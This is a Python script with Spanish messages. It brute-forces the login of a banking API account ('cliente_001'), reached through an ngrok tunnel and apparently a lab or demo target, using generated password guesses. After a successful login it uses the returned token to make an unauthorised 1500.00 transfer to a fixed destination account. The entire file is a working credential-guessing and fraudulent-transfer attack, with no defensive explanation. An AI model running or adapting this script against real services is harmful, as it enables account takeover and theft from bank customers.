import requests
import time

API_BASE = "https://statue-essential-dirtiness.ngrok-free.dev"
LOGIN_URL = f"{API_BASE}/api/v1/auth/login"
TRANSFER_URL = f"{API_BASE}/api/v1/transactions/transfer"

TARGET_USER = "cliente_001"

HEADERS = {
    "Content-Type": "application/json",
    "ngrok-skip-browser-warning": "true"
}

CONTEXT_KEYWORDS = ["Banco", "Secure"]
YEARS = ["2024", "2026"]
SYMBOLS = ["$", "#"]

def generate_passwords():
    generated = set()
    for base in CONTEXT_KEYWORDS:
        for yr in YEARS:
            for sym in SYMBOLS:
                leet = base.replace('e', '3').replace('s', '$')
                generated.add(f"{base}{yr}")
                generated.add(f"{leet}{sym}{yr}")
                generated.add(f"Banco$ecure#{yr}")
    return list(generated)

def run_api_bot():
    candidates = generate_passwords()
    print(f"🤖 [BOT API] Iniciando simulación contra {API_BASE}...\n")

    for attempt, pwd in enumerate(candidates, 1):
        login_payload = {
            "username": TARGET_USER,
            "password": pwd
        }

        try:
            response = requests.post(LOGIN_URL, json=login_payload, headers=HEADERS, timeout=5)

            if response.status_code == 200:
                login_data = response.json()
                print(f"✅ [Intento {attempt}] ¡Acceso concedido! Contraseña: '{pwd}'")

                # Preparar cabeceras de autorización
                headers_tx = HEADERS.copy()
                token = login_data.get("token") or login_data.get("access_token")
                if token:
                    headers_tx["Authorization"] = f"Bearer {token}"

                # Extraer la cuenta de origen del login si existe, o usar la predeterminada
                source_account = login_data.get("account_id", "MX-4821-0001")

                # Payload de transferencia con la estructura exacta exigida por el backend
                transfer_payload = {
                    "account_id": source_account,
                    "destination_account": "MX-9012-3344",
                    "amount": 1500.00
                }

                print(f"💸 Ejecutando transferencia: {transfer_payload}")
                tx_resp = requests.post(TRANSFER_URL, json=transfer_payload, headers=headers_tx, timeout=5)

                print(f"\n📊 Respuesta Transferencia: HTTP {tx_resp.status_code}")
                try:
                    print(f"🔍 Detalle devuelto por el Backend: {tx_resp.json()}")
                except Exception:
                    print(f"🔍 Detalle devuelto por el Backend: {tx_resp.text}")
                    
                return

            else:
                print(f"❌ [Intento {attempt}] Rechazado (HTTP {response.status_code}) -> Probado: '{pwd}'")

        except Exception as e:
            print(f"⚠️ Error de conexión en intento {attempt}: {e}")

        time.sleep(0.4)

    print("\n❌ Finalizado: Ninguna contraseña logró autenticarse.")

if __name__ == "__main__":
    run_api_bot()